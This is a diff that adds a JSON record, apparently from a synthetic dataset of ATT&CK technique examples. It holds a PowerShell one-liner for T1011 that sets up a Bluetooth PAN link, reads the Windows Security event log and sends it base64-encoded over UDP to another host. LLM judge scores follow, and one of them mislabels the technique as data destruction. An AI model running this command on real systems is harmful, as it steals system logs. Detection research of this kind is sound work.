@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1011",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "& 'C:\\Tools\\BluetoothCL.exe' /connect 11-22-33-44-55-66 NAP | Out-Null; $if=(Get-NetAdapter | ?{$_.InterfaceDescription -match 'Bluetooth.*PAN' -or $_.Name -like 'Bluetooth*'} | select -First 1).Name; netsh interface ip set address name=\"$if\" static 172.25.83.6 255.255.255.252 | Out-Null; $payload=[Convert]::ToBase64String([IO.File]::ReadAllBytes('C:\\Windows\\System32\\winevt\\Logs\\Security.evtx')); $udp=New-Object Net.Sockets.UdpClient; $udp.Client.Bind([Net.IPEndPoint]::new([Net.IPAddress]::Parse('172.25.83.6'),0)); $bytes=[Text.Encoding]::UTF8.GetBytes($payload); $udp.Send($bytes,$bytes.Length,'172.25.83.5',53127) | Out-Null; $udp.Close()",
+  "explanation": "Creates a Bluetooth PAN path and exfiltrates base64-encoded event log data via UDP to a nonstandard port over the Bluetooth interface (T1011).",
+  "rationale_steps": [
+    "Connect to Bluetooth NAP to establish the alternate medium.",
+    "Configure the Bluetooth IP using netsh, avoiding common interfaces.",
+    "Bind a UDP socket to the Bluetooth IP to ensure the medium is Bluetooth.",
+    "Send base64 data to a high-numbered, uncommon UDP port."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1011-f4a0ca3c-577a0b06",
+  "source_prompt_hash": "f4a0ca3c",
+  "timestamp_utc": "2025-09-30T08:29:05.159712Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "claude-3-7-sonnet",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced quotes, proper command separators, valid PowerShell syntax for variable assignment, pipeline operations, and object creation.",
+        "semantic_score": 4,
+        "semantic_justification": "The command aligns with T1011 (Exfiltration Over Other Network Medium) by establishing a Bluetooth connection and exfiltrating event logs over UDP, though it doesn't directly implement data destruction as described in the technique description.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-02T01:41:19.336390Z"
+      },
+      {
+        "model": "gemini-2.0-flash-thinking-exp",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed, using correct PowerShell syntax, balanced elements, and appropriate command separators for a complex one-liner.",
+        "semantic_score": 1,
+        "semantic_justification": "The command explicitly performs data exfiltration (reading a log file and sending it via UDP), which is diametrically opposed to the described intent of T1011 Data Destruction.",
+        "combined_score": 3.0,
+        "confidence": 1,
+        "timestamp": "2025-10-02T01:41:29.366132Z"
+      },
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "PowerShell invocation, quoting, separators, and object usage are well-formed and parseable with valid cmdlets and parameters.",
+        "semantic_score": 3,
+        "semantic_justification": "It aligns with T1011 by attempting Bluetooth PAN exfiltration, but practical execution is doubtful due to likely need for admin to set adapter IP and read Security.evtx, potential netsh syntax/gateway issues, and sending a very large base64 payload in a single UDP datagram.",
+        "combined_score": 4.0,
+        "confidence": 0,
+        "timestamp": "2025-10-02T01:42:13.151753Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 2.667,
+    "llm_average_score": 3.833,
+    "llm_verdict": "uncertain",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
